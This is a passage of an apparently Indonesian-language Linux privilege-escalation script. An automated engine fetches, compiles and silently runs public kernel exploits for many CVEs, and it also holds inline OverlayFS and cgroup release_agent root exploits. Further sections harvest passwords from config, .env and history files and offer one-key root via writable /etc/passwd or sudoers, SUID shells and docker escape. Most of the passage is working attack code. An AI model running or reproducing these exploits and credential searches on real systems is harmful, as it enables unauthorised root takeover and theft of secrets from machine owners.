                        command -v wget >/dev/null && wget -q "https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c" -O exp.c 2>/dev/null
                        gcc -o exploit exp.c -lpthread 2>/dev/null && ./exploit 2>/dev/null
                        ;;
                    CVE-2022-0185)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/Crusaders-of-Rust/CVE-2022-0185 . 2>/dev/null
                        make 2>/dev/null && ./exploit 2>/dev/null
                        ;;
                    CVE-2022-0847)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit . 2>/dev/null
                        make 2>/dev/null || gcc -o exploit exploit.c 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2022-25636)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/Bonfee/CVE-2022-25636 . 2>/dev/null
                        make 2>/dev/null && ./exploit 2>/dev/null
                        ;;
                    CVE-2022-2588)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/Markakd/CVE-2022-2588 . 2>/dev/null
                        make 2>/dev/null && ./exp_file_credential 2>/dev/null
                        ;;
                    CVE-2022-32250)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/theori-io/CVE-2022-32250-exploit . 2>/dev/null
                        make 2>/dev/null && ./exploit 2>/dev/null
                        ;;
                    CVE-2023-0386)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/sxlmnwb/CVE-2023-0386 . 2>/dev/null
                        make all 2>/dev/null
                        ( ./fuse ./ovlcap/lower ./gc & ) ; sleep 1; ./exp 2>/dev/null
                        ;;
                    CVE-2023-2640)
                        _godir=$(mktemp -d /tmp/gameover_XXXXX)
                        mkdir -p "$_godir"/{l,u,w,m}
                        cp /usr/bin/python3 "$_godir/l/" 2>/dev/null
                        unshare -rm sh -c "cd $_godir; setcap cap_setuid+eip l/python3 2>/dev/null; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/python3" 2>/dev/null
                        "$_godir/u/python3" -c 'import os; os.setuid(0); os.system("/bin/bash")' 2>/dev/null
                        ;;
                    CVE-2023-32233)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/Liuk3r/CVE-2023-32233 . 2>/dev/null
                        gcc -Wall -o exploit exploit.c -lmnl -lnftnl 2>/dev/null || gcc -o exploit exploit.c 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2024-1086)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/notselwyn/CVE-2024-1086 . 2>/dev/null
                        make 2>/dev/null || gcc -o exploit exploit.c 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2021-4034)
                        # PwnKit — hampir universal pre-2022
                        command -v git >/dev/null && git clone --depth=1 https://github.com/ly4k/PwnKit . 2>/dev/null
                        chmod +x PwnKit 2>/dev/null
                        ./PwnKit 2>/dev/null
                        # Fallback: arthepsy variant
                        if [ "$(id -u)" -ne 0 ]; then
                            rm -rf ./* 2>/dev/null
                            command -v git >/dev/null && git clone --depth=1 https://github.com/arthepsy/CVE-2021-4034 . 2>/dev/null
                            make 2>/dev/null && ./cve-2021-4034 2>/dev/null
                        fi
                        ;;
                    CVE-2023-4911)
                        # Looney Tunables — glibc
                        command -v git >/dev/null && git clone --depth=1 https://github.com/leesh3288/CVE-2023-4911 . 2>/dev/null
                        make 2>/dev/null || gcc -o exp gen_payload.c 2>/dev/null
                        ./exp 2>/dev/null
                        ;;
                    CVE-2022-0492)
                        # cgroup v1 release_agent
                        _cg_mnt=$(mktemp -d)
                        mount -t cgroup -o memory cgroup "$_cg_mnt" 2>/dev/null
                        mkdir -p "$_cg_mnt/x" 2>/dev/null
                        echo 1 > "$_cg_mnt/x/notify_on_release" 2>/dev/null
                        echo "#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash" > /tmp/cg_cmd.sh
                        chmod +x /tmp/cg_cmd.sh
                        echo "/tmp/cg_cmd.sh" > "$_cg_mnt/release_agent" 2>/dev/null
                        sh -c "echo \$\$ > $_cg_mnt/x/cgroup.procs" 2>/dev/null
                        sleep 1
                        [ -u /tmp/rootbash ] && /tmp/rootbash -p
                        ;;
                    CVE-2024-21626)
                        # runc Leaky Vessels
                        command -v git >/dev/null && git clone --depth=1 https://github.com/NitroCao/CVE-2024-21626 . 2>/dev/null
                        go build -o exp . 2>/dev/null || make 2>/dev/null
                        ./exp 2>/dev/null
                        ;;
                    CVE-2024-0582)
                        # io_uring UAF
                        command -v git >/dev/null && git clone --depth=1 https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 . 2>/dev/null
                        make 2>/dev/null || gcc -o exploit exploit.c -lpthread 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2024-26925)
                        # nf_tables race condition
                        command -v git >/dev/null && git clone --depth=1 https://github.com/lrh2000/CVE-2024-26925 . 2>/dev/null
                        make 2>/dev/null || gcc -o exploit exploit.c -lpthread 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2025-0927)
                        # HFS+ slab OOB
                        command -v git >/dev/null && git clone --depth=1 https://github.com/zhangguangzheng1/CVE-2025-0927 . 2>/dev/null
                        make 2>/dev/null || gcc -o exploit exploit.c 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2025-21756)
                        # vsock UAF
                        command -v git >/dev/null && git clone --depth=1 https://github.com/c0ss4ck/CVE-2025-21756 . 2>/dev/null
                        make 2>/dev/null || gcc -o exploit exploit.c -lpthread 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    *)
                        echo -e "${GRAY}[-] Tidak ada handler untuk $_cve dalam chain.${NC}"
                        ;;
                esac

                sleep 1
                if [ "$(id -u)" -eq 0 ]; then
                    echo -e "${BRIGHT_GREEN}"
                    echo "╔══════════════════════════════════════════════════════════════════════╗"
                    echo "║  [!!!] ROOT DIPEROLEH via $_cve !!!"
                    echo "║  uid=0(root) — Dropping root shell..."
                    echo "╚══════════════════════════════════════════════════════════════════════╝"
                    echo -e "${NC}"
                    log_exploit "[ROOT GAINED] $_cve"
                    /bin/bash
                    break
                else
                    echo -e "${GRAY}[-] $_cve gagal atau tidak menghasilkan root. Lanjut ke CVE berikutnya...${NC}"
                fi
            done

            echo ""
            if [ "$(id -u)" -ne 0 ]; then
                echo -e "${YELLOW}[!] Self-Root Engine selesai. Semua CVE dicoba, tidak ada yang berhasil otomatis.${NC}"
                echo -e "${YELLOW}[*] File exploit tersedia di: $_sre_dir${NC}"
                echo -e "${YELLOW}[*] Coba jalankan manual dari direktori tersebut.${NC}"
                echo -e "${CYAN}[*] Referensi: https://github.com/SecWiki/linux-kernel-exploits${NC}"
            fi
        fi
    fi
fi

################################################################################
# 30. PASSWORD AND CREDENTIAL SEARCH
################################################################################
progress "Password & Credential Search"
section "30. PASSWORD AND CREDENTIAL SEARCH"

info "Searching for potential passwords and credentials in files..."

PASSWORD_PATTERNS=(
    "password"
    "passwd"
    "pwd"
    "secret"
    "key"
    "token"
    "api_key"
    "apikey"
    "apisecret"
    "access_token"
    "accesskey"
    "private_key"
    "privatekey"
    "secretkey"
    "auth"
    "credential"
    "mysql"
    "postgres"
    "database"
    "db_password"
    "dbpass"
    "dbuser"
    "admin"
    "root"
)

# Common file extensions and locations to search
SEARCH_LOCATIONS=(
    "$HOME"
    "/tmp"
    "/var/tmp"
    "/opt"
    "/usr/local"
    "/etc"
)

PASSWORD_FOUND=0
PASSWORD_FILES=()

# Function to search for passwords in files
search_passwords() {
    local search_dir="$1"
    local max_depth=3
    
    if [ ! -d "$search_dir" ] || [ ! -r "$search_dir" ]; then
        return
    fi
    
    # Search in common file types
    find "$search_dir" -maxdepth "$max_depth" -type f \( \
        -name "*.conf" -o \
        -name "*.config" -o \
        -name "*.cfg" -o \
        -name "*.ini" -o \
        -name "*.env" -o \
        -name ".env" -o \
        -name "*.sh" -o \
        -name "*.py" -o \
        -name "*.pl" -o \
        -name "*.rb" -o \
        -name "*.php" -o \
        -name "*.js" -o \
        -name "*.json" -o \
        -name "*.xml" -o \
        -name "*.yml" -o \
        -name "*.yaml" -o \
        -name "*.properties" -o \
        -name "*.sql" -o \
        -name "*.log" -o \
        -name "*.bak" -o \
        -name "*.backup" -o \
        -name "*.old" -o \
        -name "*password*" -o \
        -name "*secret*" -o \
        -name "*credential*" \
    \) 2>/dev/null | while read -r file; do
        if [ -r "$file" ] && [ -s "$file" ]; then
            # Skip binary files
            if file "$file" 2>/dev/null | grep -qiE "(text|ascii|script)"; then
                # Search for password patterns
                for pattern in "${PASSWORD_PATTERNS[@]}"; do
                    if grep -qiE "(^|[^a-zA-Z0-9_])${pattern}([^a-zA-Z0-9_]|$)" "$file" 2>/dev/null; then
                        PASSWORD_FILES+=("$file")
                        warning "Potential password/credential found in: $file"
                        log "  File: $file"
                        
                        # Extract lines with potential passwords (max 5 lines per file)
                        grep -iE "(^|[^a-zA-Z0-9_])${pattern}([^a-zA-Z0-9_]|$)" "$file" 2>/dev/null | head -5 | while read -r line; do
                            # Mask potential passwords (show first 2 and last 2 chars)
                            MASKED_LINE=$(echo "$line" | sed -E 's/([^=:[:space:]]{1,2})[^=:[:space:]]{4,}([^=:[:space:]]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
                            log "    $MASKED_LINE"
                        done
                        
                        # Check for common password formats
                        if grep -qiE "(password|passwd|pwd)[[:space:]]*[=:][[:space:]]*[^[:space:]]{4,}" "$file" 2>/dev/null; then
                            critical "Password pattern detected in: $file"
                            show_exploit "Password in Config File" \
                                "Extract password from configuration file." \
                                "grep -i password $file\n# Or:\ncat $file | grep -i password"
                        fi
                        break
                    fi
                done
            fi
        fi
    done
}

# Search in common locations
for location in "${SEARCH_LOCATIONS[@]}"; do
    if [ -d "$location" ] && [ -r "$location" ]; then
        search_passwords "$location"
    fi
done

# Search for .env files specifically
info "Searching for .env files..."
find / -maxdepth 5 -name ".env" -type f 2>/dev/null | head -20 | while read -r env_file; do
    if [ -r "$env_file" ]; then
        warning ".env file found: $env_file"
        log "  File: $env_file"
        # Show first few lines (masked)
        head -10 "$env_file" 2>/dev/null | while read -r line; do
            MASKED=$(echo "$line" | sed -E 's/([^=]{1,2})[^=]{4,}([^=]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
            log "    $MASKED"
        done
        show_exploit ".env File" \
            "Environment files often contain credentials." \
            "cat $env_file"
    fi
done

# Search for files with "password" in filename
info "Searching for files with 'password' in name..."
find / -maxdepth 4 -iname "*password*" -type f 2>/dev/null | head -20 | while read -r pass_file; do
    if [ -r "$pass_file" ] && [ -s "$pass_file" ]; then
        warning "File with 'password' in name: $pass_file"
        log "  File: $pass_file"
        ls -la "$pass_file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

# Search for base64 encoded strings (potential passwords)
info "Searching for base64 encoded strings (potential passwords)..."
find "$HOME" /tmp /var/tmp -maxdepth 2 -type f -size -100k 2>/dev/null | head -50 | while read -r file; do
    if [ -r "$file" ] && file "$file" 2>/dev/null | grep -qi "text"; then
        # Look for base64-like strings (long strings of base64 chars)
        BASE64_MATCH=$(grep -oE '[A-Za-z0-9+/]{20,}={0,2}' "$file" 2>/dev/null | head -3)
        if [ -n "$BASE64_MATCH" ]; then
            warning "Potential base64 encoded string in: $file"
            log "  File: $file"
            echo "$BASE64_MATCH" | while read -r b64; do
                log "    $b64"
            done
        fi
    fi
done

# Search for hex encoded strings
info "Searching for hex encoded strings..."
find "$HOME" /tmp /var/tmp -maxdepth 2 -type f -size -100k 2>/dev/null | head -50 | while read -r file; do
    if [ -r "$file" ] && file "$file" 2>/dev/null | grep -qi "text"; then
        # Look for hex-like strings
        HEX_MATCH=$(grep -oE '[0-9a-fA-F]{32,}' "$file" 2>/dev/null | head -3)
        if [ -n "$HEX_MATCH" ]; then
            warning "Potential hex encoded string in: $file"
            log "  File: $file"
            echo "$HEX_MATCH" | while read -r hex; do
                log "    $hex"
            done
        fi
    fi
done

# Search in common config files
info "Checking common configuration files for credentials..."

CONFIG_FILES=(
    "/etc/mysql/my.cnf"
    "/etc/postgresql/postgresql.conf"
    "/etc/apache2/apache2.conf"
    "/etc/nginx/nginx.conf"
    "/etc/ssh/sshd_config"
    "/etc/vsftpd/vsftpd.conf"
    "/etc/samba/smb.conf"
    "/root/.bash_history"
    "/root/.mysql_history"
    "/root/.psql_history"
)

for config_file in "${CONFIG_FILES[@]}"; do
    if [ -r "$config_file" ] && [ -f "$config_file" ]; then
        if grep -qiE "(password|passwd|pwd|secret|key)" "$config_file" 2>/dev/null; then
            warning "Potential credentials in: $config_file"
            log "  File: $config_file"
            grep -iE "(password|passwd|pwd|secret|key)" "$config_file" 2>/dev/null | head -5 | while read -r line; do
                MASKED=$(echo "$line" | sed -E 's/([^=:[:space:]]{1,2})[^=:[:space:]]{4,}([^=:[:space:]]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
                log "    $MASKED"
            done
        fi
    fi
done

# Search in web application configs
info "Searching for web application configuration files..."
WEB_CONFIGS="/var/www /opt /usr/local/www"

for web_dir in $WEB_CONFIGS; do
    if [ -d "$web_dir" ] 2>/dev/null; then
        find "$web_dir" -maxdepth 3 -type f \( \
            -name "config.php" -o \
            -name "config.inc.php" -o \
            -name "database.php" -o \
            -name "settings.php" -o \
            -name "wp-config.php" -o \
            -name "config.json" -o \
            -name "application.properties" \
        \) 2>/dev/null | head -20 | while read -r web_config; do
            if [ -r "$web_config" ]; then
                if grep -qiE "(password|passwd|db_password|dbpass)" "$web_config" 2>/dev/null; then
                    warning "Potential database credentials in: $web_config"
                    log "  File: $web_config"
                    grep -iE "(password|passwd|db_password|dbpass|dbuser)" "$web_config" 2>/dev/null | head -5 | while read -r line; do
                        MASKED=$(echo "$line" | sed -E 's/([^=:[:space:]]{1,2})[^=:[:space:]]{4,}([^=:[:space:]]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
                        log "    $MASKED"
                    done
                    show_exploit "Web Config Credentials" \
                        "Extract database credentials from web application config." \
                        "grep -i password $web_config\n# Or view full file:\ncat $web_config"
                fi
            fi
        done
    fi
done

log ""
PASSWORD_FILES_COUNT=$(echo "$PASSWORD_FILES" | wc -w)
if [ "$PASSWORD_FILES_COUNT" -eq 0 ]; then
    info "No obvious password patterns found in common locations"
else
    warning "Password patterns found in $PASSWORD_FILES_COUNT file(s)! Review the files above carefully."
fi

################################################################################
# 31. QUICK EXPLOIT SUMMARY (hanya di exploit mode)
################################################################################
if [ "$EXPLOIT_MODE" -eq 1 ]; then
    progress "Quick Exploit Summary"
    section "31. QUICK EXPLOIT — PILIH VEKTOR TERBAIK"

    echo -e "${BRIGHT_RED}[QUICK WIN] Memilih vektor privilege escalation paling andal...${NC}"
    echo ""

    _qe_count=0

    # Prioritas 1: writable /etc/passwd
    if [ -w /etc/passwd ]; then
        _qe_count=$((_qe_count + 1))
        echo -e "${BRIGHT_GREEN}[$_qe_count] /etc/passwd writable ->tambah user root (MOST RELIABLE)${NC}"
    fi

    # Prioritas 2: writable sudoers
    if [ -w /etc/sudoers ]; then
        _qe_count=$((_qe_count + 1))
        echo -e "${BRIGHT_GREEN}[$_qe_count] /etc/sudoers writable ->tambah NOPASSWD ALL${NC}"
    fi

    # Prioritas 3: sudo NOPASSWD
    _sq=$(sudo -l 2>/dev/null)
    if echo "$_sq" | grep -qiE "NOPASSWD.*ALL|ALL.*NOPASSWD"; then
        _qe_count=$((_qe_count + 1))
        echo -e "${BRIGHT_GREEN}[$_qe_count] sudo NOPASSWD ALL ->sudo /bin/bash${NC}"
    fi

    # Prioritas 4: SUID bash/find/python
    for _sb in /bin/bash /usr/bin/python3 /usr/bin/python /usr/bin/find /usr/bin/perl; do
        if [ -u "$_sb" ] 2>/dev/null; then
            _qe_count=$((_qe_count + 1))
            echo -e "${YELLOW}[$_qe_count] SUID $_sb ditemukan${NC}"
        fi
    done

    # Prioritas 5: docker group
    if groups | grep -q docker; then
        _qe_count=$((_qe_count + 1))
        echo -e "${YELLOW}[$_qe_count] User dalam docker group ->container escape${NC}"
    fi

    if [ "$_qe_count" -eq 0 ]; then
        echo -e "${GRAY}Tidak ada quick win yang ditemukan. Review manual hasil scan di atas.${NC}"
    else
        echo ""
        echo -ne "${CYAN}Jalankan exploit terbaik yang tersedia sekarang? [y/N]: ${NC}"
        read -r -t 30 _qe_ans 2>/dev/null || _qe_ans="n"

        if [ "$_qe_ans" = "y" ] || [ "$_qe_ans" = "Y" ]; then
            if [ -w /etc/passwd ]; then
                echo -e "${BRIGHT_GREEN}[*] Menjalankan: tambah root user via /etc/passwd...${NC}"
                exploit_add_root_user groovy groovy1669
            elif [ -w /etc/sudoers ]; then
                echo -e "${BRIGHT_GREEN}[*] Menjalankan: tambah NOPASSWD ke sudoers...${NC}"
                echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers && sudo /bin/bash
            elif echo "$_sq" | grep -qiE "NOPASSWD.*ALL|ALL.*NOPASSWD"; then
                echo -e "${BRIGHT_GREEN}[*] Menjalankan: sudo /bin/bash...${NC}"
                sudo /bin/bash
            elif [ -u /usr/bin/python3 ]; then
                echo -e "${BRIGHT_GREEN}[*] Menjalankan: SUID python3 shell...${NC}"
                /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
            elif [ -u /usr/bin/find ]; then
                echo -e "${BRIGHT_GREEN}[*] Menjalankan: SUID find shell...${NC}"
                /usr/bin/find / -name . -exec /bin/bash \;
            elif groups | grep -q docker; then
                echo -e "${BRIGHT_GREEN}[*] Menjalankan: docker escape...${NC}"
                docker run -v /:/mnt --rm -it alpine chroot /mnt bash
            fi
        fi
    fi
fi

################################################################################
# 32. SUMMARY AND RECOMMENDATIONS
################################################################################
progress "Final Summary"
section "32. SUMMARY AND RECOMMENDATIONS"

echo ""
echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}║                    ENUMERATION COMPLETE                             ║${NC}"
echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Display statistics
echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                    VULNERABILITY STATISTICS                           ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BRIGHT_RED}  [!!!] Critical Vulnerabilities Found: ${CRITICAL_COUNT}${NC}"
echo -e "${YELLOW}  [!] Warnings Found: ${WARNING_COUNT}${NC}"
echo -e "${BLUE}  [*] Exploitable SUID Binaries: ${SUID_COUNT}${NC}"
echo -e "${BLUE}  [*] Writable Files/Directories: ${WRITABLE_COUNT}${NC}"
echo -e "${BLUE}  [*] Kernel Vulnerabilities: ${KERNEL_VULN_COUNT}${NC}"
echo ""

# Risk assessment
TOTAL_VULN=$((CRITICAL_COUNT + WARNING_COUNT))
if [ "$TOTAL_VULN" -eq 0 ]; then
    echo -e "${GREEN}  ✓ No obvious vulnerabilities detected (but always verify manually)${NC}"
elif [ "$CRITICAL_COUNT" -gt 5 ]; then
    echo -e "${BRIGHT_RED}  ⚠ HIGH RISK: Multiple critical vulnerabilities detected!${NC}"
elif [ "$CRITICAL_COUNT" -gt 0 ]; then
    echo -e "${YELLOW}  ⚠ MEDIUM RISK: Critical vulnerabilities detected${NC}"
else
    echo -e "${GREEN}  ✓ LOW RISK: Only warnings detected${NC}"
fi
echo ""

info "Report saved to: $OUTPUT_FILE"
info "Exploit methods saved to: $EXPLOIT_FILE"

log ""
log "═══════════════════════════════════════════════════════════════════════"
log "VULNERABILITY STATISTICS"
log "═══════════════════════════════════════════════════════════════════════"
log "Critical Vulnerabilities: $CRITICAL_COUNT"
log "Warnings: $WARNING_COUNT"
log "Exploitable SUID Binaries: $SUID_COUNT"
log "Writable Files/Directories: $WRITABLE_COUNT"
log "Kernel Vulnerabilities: $KERNEL_VULN_COUNT"
log ""

echo ""
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}                    NEXT STEPS & RECOMMENDATIONS                        ${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
echo ""

warning "1. Review the exploit methods file: $EXPLOIT_FILE"
warning "2. Research kernel exploits for: $(uname -r)"
warning "3. Check for known CVEs in installed software versions"
warning "4. Test SUID binaries for exploitation methods"
warning "5. Verify sudo permissions and test for bypasses"
warning "6. Check for misconfigured services and cron jobs"
warning "7. Look for writable system files and directories"
warning "8. Check for exposed credentials in history files"
warning "9. Test Docker/container escape if applicable"
warning "10. Verify network services for additional attack surface"

echo ""
echo -e "${CYAN}Useful Resources:${NC}"
echo -e "  • Exploit-DB: https://www.exploit-db.com"
echo -e "  • GTFOBins: https://gtfobins.github.io"
echo -e "  • Linux Kernel Exploits: https://github.com/SecWiki/linux-kernel-exploits"
echo -e "  • LinPEAS: https://github.com/carlospolop/PEASS-ng"
echo ""

echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}║  Scan completed successfully! Check the report files above.        ║${NC}"
echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""